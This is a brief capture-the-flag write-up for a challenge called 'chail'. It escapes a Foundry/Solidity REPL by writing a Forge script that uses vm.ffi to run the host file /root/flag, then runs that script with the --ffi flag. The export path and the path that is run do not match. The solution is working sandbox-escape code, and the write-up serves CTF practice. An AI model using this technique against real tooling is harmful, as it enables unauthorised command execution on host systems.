# chail

input this in REPL

```solidity
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Solve is Script {
    function run() public {
        string[] memory cmds = new string[](1);
        cmds[0] = "/root/flag";
        console.log(string(vm.ffi(cmds)));
    }
}
```

then export it 

```bash
!export scripts/Solve.s.sol
```

it is now saved in `scripts/REPL.s.sol`, so we call it

remember for command execution we do `--ffi`

```bash
!exec forge script script/REPL.s.sol:Solve --ffi
```